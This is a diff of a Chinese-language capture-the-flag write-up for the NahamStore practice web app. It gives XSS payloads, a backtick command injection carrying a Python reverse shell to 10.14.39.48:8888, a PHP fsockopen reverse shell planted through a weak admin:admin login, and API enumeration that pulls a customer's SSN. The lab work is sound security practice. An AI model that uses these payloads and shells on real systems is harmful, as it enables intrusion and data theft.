@@ -1,3 +1,5 @@
+
+
 # NahamStore
 
 - 漏洞赏金
@@ -11,7 +13,7 @@ NahamStore的创建是为了测试您在NahamSec的“漏洞赏金狩猎和Web�
 
 可能我的顺序，跟别人以及题目都不太一样，有点乱，但是这是正常的。
 
-我是看到什么可能的漏洞就找什么漏洞，最后再看看题目有没有什么要求和提示、还有什么漏洞需要找
+这个房间很有意思，涵盖了许多常见web漏洞
 
 ---
 
@@ -272,3 +274,175 @@ good
 	r                       [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 254ms]
 
 收工，睡觉，剩下的漏洞明天再找
+
+
+## XSS - 1
+
+访问marketing.nahamstore.thm，随便访问一个不存在的页面，返回了/?error，通过error回显错误信息
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/298d6f1036e84b2b8b2186fdb0cb575a.png)
+
+## XSS - 2
+
+添加商品到购物车，在购物车点击商品会附带name参数，查看源代码可以发现该参数控制页面title标签，很容易就可以绕过
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/50f6a6fdf688427f9ab9dbee87cccf48.png)
+
+## XSS - 3
+
+购买商品，付款这里，购买后会显示user agent，burp修改ua
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/ff7782472a2744c9882e65157484efba.png)
+
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/2345dce5abf94551af2d3de0bd9f8b83.png)
+
+## XSS - 4
+
+商品退货处，查看源代码可以看到被textarea包裹，也是简单绕过
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/3f7c0d15ee1c4d31b8cdb0d9375929bd.png)
+
+	</textarea><script>alert('hack');</script>
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/65c63a77ff484f15aab4eb8d890d440b.png)
+
+## XSS - 5
+
+访问任意不存在的目录，路径会注入到页面中，也是简单标签绕过
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/f6152cc91dfb4259aa669a56c8716a7d.png)
+
+## XSS - 6
+
+主页的搜索表单中，查看源代码：
+
+```javascript
+</html><script>
+    var search = ''alert('hack')'';
+    $.get('/search-products?q=' + search,function(resp){
+        if( resp.length == 0 ){
+
+            $('.product-list').html('<div class="text-center" style="margin:10px">No matching products found</div>');
+
+        }else {
+            $.each(resp, function (a, b) {
+                $('.product-list').append('<div class="col-md-4">' +
+                    '<div class="product_holder" style="border:1px solid #ececec;padding: 15px;margin-bottom:15px">' +
+                    '<div class="image text-center"><a href="/product?id=' + b.id + '"><img class="img-thumbnail" src="/product/picture/?file=' + b.img + '.jpg"></a></div>' +
+                    '<div class="text-center" style="font-size:20px"><strong><a href="/product?id=' + b.id + '">' + b.name + '</a></strong></div>' +
+                    '<div class="text-center"><strong>$' + b.cost + '</strong></div>' +
+                    '<div class="text-center" style="margin-top:10px"><a href="/product?id=' + b.id + '" class="btn btn-success">View</a></div>' +
+                    '</div>' +
+                    '</div>');
+            });
+        }
+    });
+</script>
+```
+
+很明显，我们输入的数据被拼接到search变量中，通过字符串拼接“+”来达到逃逸引号并且被正常执行的目的：
+
+	'%2balert('hack');%2b'
+
+注意需要将加号进行urlencode
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/64374f30b3d44bd6aeaa0cb850936136.png)
+
+## XSS - 7
+
+在商品页面处
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/ae022f2edcc14d7c923a8c89d48190a7.png)
+
+post参数discount没有用处，但是把它拿到get请求上来，猜测discount从$_REQUEST从取参数，将会覆盖掉discount的初始值
+
+但是这里会把单引号和括号给过滤掉，我们这里需要使用双引号逃逸，如果尝试：
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/67efafc0653b4a899485eadbdd6e41b2.png)
+
+很明显，这是不行的，可以将后面的双引号作为其他参数：
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/873206910cea4197982cf1d0ee2d987f.png)
+
+这样alert将被成功执行：
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/95b2aaf8095d4e8c9a705828da2785cd.png)
+
+## RCE - 1
+
+对于rce，这个站基本上许多功能都看完了，应该没有哪里能rce，所以我把眼光放到了调用api的那两个页面上
+
+没错，又是那个转pdf的功能，对着idfuzzing
+
+最终结果是使用反引号就可以执行任意命令
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/6ab3e5b585d5411c8ff249eb7db32a2e.png)
+
+这里通过python来getshell，payload:
+
+	what=order&id=5`python3+-c+'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.39.48",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/ab349fba655144eb8924659c3ef0e598.png)
+
+### 验证想法
+
+还记得昨天的idor吗，通过shell，我找到了相关代码：
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/3368d85661e44a0d982d06ab0cd0847c.png)
+
+我的猜想果然没错
+
+## 侦察
+
+利用rce，查看/etc/hosts，发现几个子域：
+
+	172.17.0.1      nahamstore-2020.nahamstore.thm
+	172.17.0.1      nahamstore-2020-dev.nahamstore.thm
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/a309ceed05b1406b889bb570273e3a0f.png)
+
+对着api再扫一波：
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/d07f1bd749e44d4ab48412bd39429736.png)
+
+/api/customers回显：
+
+	"customer_id is required"
+
+简单枚举一下就可以找到Jimmy Jones的ssn
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/d03a866e6cc743c392ae8b0eee139a43.png)
+
+## RCE - 2
+
+8000端口的web什么都没有，扫一波
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/27a4e5524e6840d78394550725282bec.png)
+
+这是一个登录页面，弱口令就进去了 admin:admin
+
+很明显能看出，这里后台可以编辑marketing子域的页面
+
+修改页面为payload:
+
+```php
+<?php
+$sock=fsockopen("10.14.39.48",8888);$proc=proc_open("/bin/bash -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
+?>
+```
+
+访问被修改的页面，成功getshell:
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/0af314b206524356b992bdef4f92f3aa.png)
+## XXE
+
+我对XXE还是比较陌生，所以这里也是看wp学着做的，事后去多了解了一下xxe
+
+## 结束
+
+打了两天，回顾了许多当时渗透测试基础path中的web以及owasp top 10，我觉得我对xxe还是比较生疏，得找几道xxe的题做做。
+
+全程burp suite立大功
+
+整体来讲，这个房间真的非常不错，前几天我一直不舍得打，一直留到现在，如果有更多这样的房间那就太好了
